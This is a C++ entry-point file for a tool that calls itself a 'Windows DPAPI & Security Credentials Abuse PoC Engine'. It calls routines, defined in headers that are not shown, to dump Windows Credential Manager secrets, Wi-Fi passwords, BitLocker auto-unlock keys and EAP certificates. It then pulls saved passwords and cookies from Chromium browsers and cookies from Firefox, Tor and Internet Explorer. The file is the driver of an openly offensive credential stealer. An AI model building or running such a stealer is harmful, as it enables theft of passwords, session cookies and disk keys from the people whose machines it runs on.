#include <iostream>
#include <windows.h>
#include "SystemCredentialsDump.h"
#include "ChromiumDump.h"
#include "GeckoAndIECookies.h"

int main() {
    
    SetConsoleOutputCP(CP_UTF8); //settinc console output without IO synchronization

    std::cout << "========================================================\n";
    std::cout << "  Windows DPAPI & Security Credentials Abuse PoC Engine \n";
    std::cout << "========================================================\n";

    // 1. System Modules (CredMan, Wi-Fi, BitLocker, Certs)
    SystemCredentialsDump::DumpCredManager();
    SystemCredentialsDump::DumpWifiPasswords();
    SystemCredentialsDump::DecryptBitLockerAutoUnlock();
    SystemCredentialsDump::DumpEAPCertificates();

    // 2. Chromium (Passwords + Cookies)
    std::cout << "\n";
    ChromiumDump::Run();

    // 3. Firefox, Tor, The Best and Fastest Browser Ever XD (Coookies)
    std::cout << "\n";
    GeckoAndIECookies::RunAll();

    std::cout << "\n========================================================\n";
    std::cout << "[+] Execution has finished (finally) PoC.\n";
    
    return 0;
}